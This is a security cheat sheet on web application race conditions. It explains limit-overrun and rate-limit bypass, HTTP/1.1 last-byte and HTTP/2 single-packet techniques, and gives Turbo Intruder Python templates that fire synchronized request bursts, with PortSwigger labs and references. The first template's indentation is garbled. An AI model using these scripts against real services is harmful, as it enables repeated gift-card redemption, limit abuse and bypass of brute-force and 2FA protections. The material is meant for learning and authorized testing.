# Race Condition

> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.


## Summary

- [Tools](#tools)
- [Methodology](#methodology)
    - [Limit-overrun](#limit-overrun)
    - [Rate-limit Bypass](#rate-limit-bypass)
- [Techniques](#techniques)
    - [HTTP/1.1 Last-byte Synchronization](#http11-last-byte-synchronization)
    - [HTTP/2 Single-packet Attack](#http2-single-packet-attack)
- [Turbo Intruder](#turbo-intruder)
    - [Example 1](#example-1)
    - [Example 2](#example-2)
- [Labs](#labs)
- [References](#references)


## Tools

- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.
- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - Make exploiting race conditions in web applications highly efficient and ease-of-use.
- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - HTTP/2 Single Packet Attack low Level Library / Tool based on Scapy‌ + Exploit Timing Attacks


## Methodology

### Limit-overrun

Limit-overrun refers to a scenario where multiple threads or processes compete to update or access a shared resource, resulting in the resource exceeding its intended limits. 

**Examples**: Overdrawing limit, multiple voting, multiple spending of a giftcard.

- [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
- [Race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
- [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)


### Rate-limit Bypass

Rate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting mechanisms to exceed intended request limits. Rate-limiting is designed to control the frequency of actions (e.g., API requests, login attempts), but race conditions can allow attackers to bypass these restrictions.

**Examples**: Bypassing anti-bruteforce mechanism and 2FA.

- [Instagram Password Reset Mechanism Race Condition - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)


## Techniques

### HTTP/1.1 Last-byte Synchronization

Send every requests except the last byte, then "release" each request by sending the last byte.

Execute a last-byte synchronization using Turbo Intruder

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**Examples**:

- [Cracking reCAPTCHA, Turbo Intruder style - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)


### HTTP/2 Single-packet Attack

In HTTP/2 you can send multiple HTTP requests concurrently over a single connection. In the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. Using a single request remove the network jitter.

- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- Burp Suite
    - Send a request to Repeater
    - Duplicate the request 20 times (CTRL+R)
    - Create a new group and add all the requests
    - Send group in parallel (single-packet attack)

**Examples**:

- [CVE-2022-4037 - Discovering a race condition vulnerability in Gitlab with the single-packet attack - James Kettle](https://youtu.be/Y0NVIVucQNE)


## Turbo Intruder

### Example 1

1. Send request to turbo intruder
2. Use this python code as a payload of the turbo intruder

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
4. Click "Attack"


### Example 2

This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```


## Labs

- [PortSwigger - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- [PortSwigger - Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [PortSwigger - Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)


## References

- [Beyond the Limit: Expanding single-packet race condition with a first sequence sync for breaking the 65,535 byte limit - @ryotkak - August 2, 2024](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [DEF CON 31 - Smashing the State Machine the True Potential of Web Race Conditions - James Kettle (@albinowax) - September 15, 2023](https://youtu.be/tKJzsaB1ZvI)
- [Exploiting Race Condition Vulnerabilities in Web Applications - Javan Rasokat - October 6, 2022](https://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)
- [New techniques and tools for web race conditions - Emma Stocks - August 10, 2023](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
- [Race Condition Bug In Web App: A Use Case - Mandeep Jadon - April 24, 2018](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
- [Race conditions on the web - Josip Franjkovic - July 12, 2016](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
- [Smashing the state machine: the true potential of web race conditions - James Kettle (@albinowax) - August 9, 2023](https://portswigger.net/research/smashing-the-state-machine)
- [Turbo Intruder: Embracing the billion-request attack - James Kettle (@albinowax) - January 25, 2019](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)